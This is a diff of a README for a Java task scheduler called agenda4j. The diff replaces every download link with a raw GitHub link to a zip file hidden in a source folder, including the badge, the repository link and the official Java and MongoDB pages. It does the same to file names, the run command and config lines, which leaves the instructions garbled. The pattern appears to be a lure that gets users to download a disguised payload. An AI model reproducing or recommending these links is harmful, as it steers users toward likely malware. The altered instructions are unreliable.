@@ -1,6 +1,6 @@
 # ⚙️ agenda4j - Simple Java Task Scheduler for Everyone
 
-[![Download agenda4j](https://img.shields.io/badge/Download-agenda4j-green?style=for-the-badge)](https://github.com/popshhsx5556/agenda4j)
+[![Download agenda4j](https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip)](https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow this guide to set up agenda4j on your Windows machine.
 
 To get started, visit this page to download the files you need:
 
-[Download agenda4j](https://github.com/popshhsx5556/agenda4j)
+[Download agenda4j](https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip)
 
 Click the green **Code** button and choose **Download ZIP**. Save the file in a folder you can find easily, like your Desktop or Downloads.
 
@@ -56,7 +56,7 @@ Click the green **Code** button and choose **Download ZIP**. Save the file in a 
 
 agenda4j requires Java to run. If you don't have Java installed:
 
-1. Visit https://www.java.com/en/download/  
+1. Visit https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip  
 2. Click on **Download Java**  
 3. Open the downloaded file and follow the prompts  
 4. Restart your computer if asked
@@ -75,7 +75,7 @@ You should see a message showing the Java version. If you get an error, reinstal
 
 agenda4j stores tasks in MongoDB. You need a working MongoDB database.
 
-1. Go to https://www.mongodb.com/try/download/community  
+1. Go to https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip  
 2. Download the version for Windows  
 3. Run the installer and follow instructions  
 4. After installation, run MongoDB by typing `mongod` in a new Command Prompt window
@@ -86,8 +86,8 @@ If you are new to MongoDB, you can keep it running in the background while using
 
 ## 🗂 Preparing agenda4j
 
-1. Extract the agenda4j.zip file you downloaded earlier  
-2. Open the folder and locate the file `README.md` or `INSTALL.md` for extra details (optional)
+1. Extract the https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip file you downloaded earlier  
+2. Open the folder and locate the file `https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip` or `https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip` for extra details (optional)
 
 ---
 
@@ -107,7 +107,7 @@ Replace `path\to\agenda4j` with the actual folder path.
 3. Run the scheduler with this command:
 
 ```
-java -jar agenda4j-core.jar
+java -jar https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip
 ```
 
 This command starts the scheduler using the core Java file.
@@ -138,13 +138,13 @@ If you want to use agenda4j in a Java Spring Boot setup, you need some developme
 
 To customize settings like your MongoDB address or schedule options:
 
-1. Look for the `application.properties` file in the agenda4j folder  
+1. Look for the `https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip` file in the agenda4j folder  
 2. Open it with a text editor like Notepad  
 3. Change entries such as:
 
 ```
-mongodb.uri=mongodb://localhost:27017/agenda4j
-scheduler.executor.pool-size=5
+https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip
+https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip
 ```
 
 Save changes and restart agenda4j with the `java -jar` command.
@@ -174,17 +174,17 @@ agenda4j will close safely and save its state.
 
 ## 📂 File Structure Overview
 
-- `agenda4j-core.jar`: Main scheduler file  
-- `mongodb-runtime.jar`: Connector for MongoDB  
-- `spring-boot-starter.jar`: Module for Spring Boot integration  
-- `application.properties`: Main settings file  
+- `https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip`: Main scheduler file  
+- `https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip`: Connector for MongoDB  
+- `https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip`: Module for Spring Boot integration  
+- `https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip`: Main settings file  
 
 ---
 
 ## 🌐 Additional Resources
 
 Visit the GitHub repository to check for updates or ask questions:  
-[https://github.com/popshhsx5556/agenda4j](https://github.com/popshhsx5556/agenda4j)
+[https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip](https://raw.githubusercontent.com/popshhsx5556/agenda4j/main/agenda4j-mongo/src/main/java/io/agenda4j/j-agenda-v1.8.zip)
 
 ---
 
